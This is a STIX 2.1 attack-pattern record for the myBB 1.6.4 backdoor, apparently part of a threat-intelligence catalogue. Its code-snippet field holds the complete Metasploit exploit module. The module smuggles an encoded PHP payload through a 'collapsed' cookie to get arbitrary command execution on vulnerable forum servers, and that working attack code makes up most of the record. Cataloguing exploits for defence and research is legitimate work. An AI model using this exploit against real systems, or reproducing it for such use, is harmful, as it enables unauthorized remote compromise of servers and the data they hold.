{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--285362f2-d730-4249-9b5d-372fab4c69de",
    "created": "2024-08-14T17:13:06.863832Z",
    "modified": "2024-08-14T17:13:06.863837Z",
    "name": "myBB 1.6.4 Backdoor Arbitrary Command Execution",
    "description": " myBB is a popular open source PHP forum software. Version 1.6.4 contained an unauthorized backdoor, distributed as part of the vendor's source package. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/mybb_backdoor.rb",
            "external_id": "mybb_backdoor.rb"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20121010011259/http://secunia.com/advisories/46300/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'myBB 1.6.4 Backdoor Arbitrary Command Execution',\n      'Description'    => %q{\n        myBB is a popular open source PHP forum software. Version 1.6.4 contained an\n        unauthorized backdoor, distributed as part of the vendor's source package.\n      },\n      'Author'         =>\n        [\n          'tdz',\n        ],\n      'License'        => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'NOCVE' => ['Reason not given']\n      },\n      'References'     =>\n        [\n          [ 'OSVDB', '76111' ],\n          [ 'BID', '49993' ],\n          [ 'URL', 'http://web.archive.org/web/20121010011259/http://secunia.com/advisories/46300/' ],\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'Space'       => 4000,\n          'DisableNops' => true,\n          'Keys'        => ['php'],\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-10-06'\n    ))\n\n    register_options(\n      [\n        OptString.new('URI', [ true, \"myBB path\", '/index.php']),\n      ])\n  end\n\n\n  def uri\n    normalize_uri(datastore['URI'])\n  end\n\n  def check\n    vprint_status(\"Checking target\")\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri' => uri\n      }, 10\n    )\n\n    if (not res) or (not res.code.between?(200,299))\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Detected\n    end\n  end\n\n  def exploit\n    print_status(\"Sending exploit request\")\n\n    # for details of the backdoor mechanism.\n    cookie = \"collapsed=0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|\"\n    cookie << Rex::Text.uri_encode(payload.encoded)\n\n    response = send_request_raw({\n      'method'  => 'GET',\n      'global' => true,\n      'uri' => uri,\n      'headers' => { 'Cookie' => cookie }\n    },10)\n\n    if (not response) or (not response.code.between?(200,299))\n      print_error \"Cannot connect to #{uri} on #{datastore['RHOST']}, got #{response ? response.code : 'no response'}.\"\n    else\n      handler\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-06",
    "x_mitre_platforms": [
        "['php']"
    ]
}